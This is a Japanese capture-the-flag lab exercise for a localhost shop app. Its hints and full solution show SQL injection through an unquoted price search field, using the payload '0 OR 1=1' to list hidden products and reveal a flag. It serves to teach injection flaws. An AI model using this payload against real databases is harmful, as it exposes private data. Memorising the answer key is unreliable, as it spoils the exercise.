# 05 - Price Filter Injection

`http://localhost:3005`の商品検索から、非公開の商品に隠されたflagを表示せよ。

検索対象には「商品名」「説明」「価格」がある。価格を選んだ場合だけ、入力値が
数値としてSQLへ直接入る。

## ヒント

<details><summary>ヒント1</summary>

検索対象で「価格」を選ぶと、次のSQLが実行される。

```sql
SELECT id, name, description FROM products WHERE price = 入力値
```

</details>

<details><summary>ヒント2</summary>

03と同じ`OR 1=1`を使える。「価格」を選び、価格の後ろへ条件を追加しよう。

</details>

<details><summary>解答</summary>

検索対象で「価格」を選び、検索欄へ次を入力する。

```
0 OR 1=1
```

実行されるSQL:

```sql
SELECT id, name, description FROM products WHERE price = 0 OR 1=1
```

`1=1`は必ず正しいため、非公開の商品を含む全商品が表示される。
`Internal Backup`の説明欄にflagがある。

</details>
